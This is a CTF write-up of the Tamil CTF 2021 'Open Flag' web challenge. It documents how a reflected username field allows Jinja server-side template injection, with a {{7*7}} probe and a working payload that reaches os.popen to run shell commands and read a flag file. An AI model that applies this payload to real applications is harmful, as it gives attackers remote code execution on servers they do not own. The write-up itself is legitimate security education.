# Tamil CTF 2021 - Open Flag
### Description:
What is open flag challenge ? I will tell the location of flag where its located, you just need to access that flag.
### Finding the vulnerability:
The given website consists of 2 pages: A registration panel and a static page.


![registration page](https://github.com/apostolides/ctf-writeups/blob/master/TamilCTF_2021/Open_Flag/register.png)


![static page](https://github.com/apostolides/ctf-writeups/blob/master/TamilCTF_2021/Open_Flag/index.png)


We notice that upon entering a username it gets reflected on the static page. After trying to inject some payloads we notice that user input is not sanitized. 


![poc1](https://github.com/apostolides/ctf-writeups/blob/master/TamilCTF_2021/Open_Flag/poc1.png)

Therefore we can test the website for Server Side Template Injections. We discover that they use jinja templating engine. Using a simple payload like the one below we can confirm the vulnerability.     
```python
{{7*7}}
```
![poc2](https://github.com/apostolides/ctf-writeups/blob/master/TamilCTF_2021/Open_Flag/poc2.png)

### Solution:
Using the crafted payload below we can exploit the SSTI and get code execution.

```python
{{config.__class__.__init__.__globals__['os'].popen('base64 flag.jpg').read()}}
```
This will reflect the flag image in the static html page base64 encoded. Save response in a txt file and decode with:
```bash
base64 -d flag.txt > flag.jpg
```
Flag is presented in the image.


![flag](https://github.com/apostolides/ctf-writeups/blob/master/TamilCTF_2021/Open_Flag/flag.jpg)

Happy hacking :)
